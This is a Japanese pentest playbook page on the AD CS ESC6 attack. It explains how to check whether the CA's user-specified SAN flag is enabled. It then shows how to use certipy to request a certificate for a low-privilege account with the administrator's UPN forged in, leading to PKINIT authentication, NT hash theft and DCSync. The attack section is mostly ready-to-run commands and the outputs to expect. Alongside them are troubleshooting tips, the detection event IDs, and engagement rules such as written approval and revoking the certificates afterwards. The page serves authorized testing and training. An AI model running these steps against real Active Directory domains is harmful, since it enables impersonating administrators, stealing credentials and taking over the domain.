# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 CA フラグ

> **スコープ**: CA 全体のフラグ `EDITF_ATTRIBUTESUBJECTALTNAME2` が有効な場合に、テンプレートの `Enrollee Supplies Subject` が False でも任意 UPN で証明書を申請〜DCSync まで扱う。ESC1 が使えない環境でも有効。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（任意ユーザー名で発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。演習環境では制約なし。

## 着火条件

- Certipy の出力の CA セクションに `User Specified SAN: Enabled` と表示されている（または `[!] Vulnerabilities: ESC6` が表示されている）
- 加えて、低権限ユーザーが Enrollment 権限を持つ **Client Authentication EKU を含む任意テンプレート** が存在する

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `certipy`（`pip install certipy-ad --break-system-packages`）
- 必要な権限: Client Authentication テンプレートへの Enrollment 権限を持つドメインユーザー（低権限ユーザーで可）

## 先に確認すること

ESC6 は **CA フラグ**の問題。`certipy find` の `Certificate Authorities` セクションを必ず確認する（テンプレートを見ていても気づかない）。

> **重要**: Microsoft は 2022 年 5 月のパッチ（KB5014754）以降、Strong Mapping による厳密な検証が行われるため、パッチ適用済み DC では ESC6 の効果が制限される場合がある。

**攻撃者の思考トレース:** ESC1 は「テンプレートに `ENROLLEE_SUPPLIES_SUBJECT` フラグが設定されている」ことが条件だが、ESC6 は CA 全体のフラグが有効なため、テンプレート側のフラグが False でも SAN を自由に指定できる。

---

## 1. CA フラグの確認

**コマンド:**

```bash
# [Attacker] CA 設定を含む詳細列挙（Certificate Authorities セクションを確認）
certipy find -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -vulnerable -stdout
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `User Specified SAN: Enabled` | ESC6 の核心条件が成立 | §2 証明書申請へ |
| `User Specified SAN: Disabled` | ESC6 の条件を満たさない | ESC1 / ESC2 / ESC3 で代替を探す |

**使用するテンプレートの優先順位:**

| 優先度 | テンプレート | 備考 |
|-------|------------|------|
| 1位 | `User` | デフォルト存在。Domain Users が Enrollment 可能 |
| 2位 | `Computer` | コンピューターアカウント向けだが Domain Users から申請できる環境もある |
| 3位 | カスタムテンプレート | `Client Authentication: True` かつ低権限ユーザーが Enrollment 権限を持つテンプレート |

---

## 2. 任意の Client Auth テンプレートで UPN を指定して証明書申請

**事前準備（必須）:** `sudo ntpdate -u [DC_IP]` で時刻同期。

**コマンド:**

```bash
# [Attacker] User テンプレートを使い、UPN を administrator に偽装して証明書申請
certipy req \
  -ca [CA_NAME] -template User \
  -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] \
  -upn administrator@[DOMAIN]
# ESC6 フラグが有効なため、テンプレートの Enrollee Supplies Subject が False でも UPN を指定できる
# → administrator.pfx が生成される
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Saved certificate ... to 'administrator.pfx'` | 証明書発行成功 | §3 PKINIT 認証へ |
| 証明書申請が拒否される | テンプレートが `-upn` を受け付けない設定 | 別テンプレートを試す |
| KB5014754 適用済みで `certipy auth` が失敗 | Strong Mapping が有効 | `-ldap-shell` で証明書と AD アカウントのマッピングを確認 |

---

## 3. PKINIT 認証 → NT ハッシュ取得 → DCSync

ESC1 の §3・§4 と同一フロー → `ESC1.md`

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| KB5014754 適用済みで `certipy auth` が失敗する | DC が Strong Mapping を要求している。`-ldap-shell` オプションで確認 |
| テンプレート `User` の Enrollment 権限がない | `certipy find` で自グループが Enrollment 可能なテンプレートを探す |

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（証明書発行）/ 4768（TGT 要求）/ MDI「疑わしい証明書の使用」
- **業務影響リスク**: 証明書発行自体は業務影響なし。DCSync は書面承認必須
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効（`certipy ca -revoke [REQUEST_ID]`）/ ✅ pfx・NT ハッシュ・TGT の暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定（CA セクションの `User Specified SAN` 確認が必要）→ `Overview.md`
- 前：ESC1（テンプレートレベルの ENROLLEE_SUPPLIES_SUBJECT 版）→ `ESC1.md`
- 後：証明書取得後 → PKINIT → DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
